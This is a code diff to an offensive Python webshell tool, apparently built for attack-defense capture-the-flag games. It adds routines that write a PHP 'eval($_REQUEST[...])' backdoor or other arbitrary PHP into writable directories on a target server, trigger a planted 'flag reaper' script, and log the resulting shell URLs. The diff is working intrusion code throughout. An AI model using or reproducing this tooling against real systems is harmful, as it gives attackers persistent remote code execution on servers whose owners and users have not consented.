@@ -543,15 +543,40 @@ class WebShell():
             Log.error("Some error occured while checking!")
             return False
 
+
     def auto_inject_webshell(self, filename, password):
-        Log.info("Auto injecting : [%s] => [%s]" % (filename, password))
-        webshell_content = "<?php eval($_REQUEST[%s]);?>\r<?php phpinfo();?>                                        \n" % (password)
+        content = "<?php eval($_REQUEST[%s]);?>\r<?php phpinfo();?>                                        \n" % (password)
+        self.auto_inject_phpfile(filename, content)
+
+    def auto_inject_flag_reaper(self, filename, content):
+        url = self.auto_inject_phpfile(filename, content)
+        if url:
+            Log.success("Inject flag reaper success!")
+            Log.info("Trying to visit : [%s] to launch the flag reaper..." % (url))
+            Log.info("Setting timeout to 1 second ...")
+            try:
+                response = requests.get(url, timeout=1)
+                Log.error("Error! Maybe the directory cannnot execute php script!")
+                Log.error("\n%s\n" % (response.content))
+            except Exception as e:
+                error_content = str(e)
+                if "Read timed out" in error_content:
+                    return True
+                else:
+                    Log.error("Error! Maybe the directory is not writable!")
+        else:
+            Log.error("Inject flag reaper error!")
+        return False
+
+    def auto_inject_phpfile(self, filename, webshell_content):
+        Log.info("Auto injecting : [%s] => [%s]" % (filename, repr(webshell_content)))
         Log.info("Code : [%s]" % (repr(webshell_content)))
         Log.info("Length : [%d]" % (len(webshell_content)))
         Log.info("Getting writable dirs...")
         writable_dirs = self.get_writable_directory()
         if len(writable_dirs) == 0:
             Log.error("No writable dirs...")
+            return False
         else:
             for writable_dir in writable_dirs:
                 Log.info("Writing [%s] into : [%s]" % (repr(webshell_content), writable_dir))
@@ -560,5 +585,6 @@ class WebShell():
                 base_url = "%s%s" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s/" % (self.webroot), ""))
                 webshell_url = "%s/%s" % (base_url, filename)
                 with open("Webshell.txt", "a+") as f:
-                    log_content = "%s => %s\n" % (webshell_url, password)
+                    log_content = "%s => %s\n" % (webshell_url, repr(webshell_content))
                     f.write(log_content)
+                return webshell_url
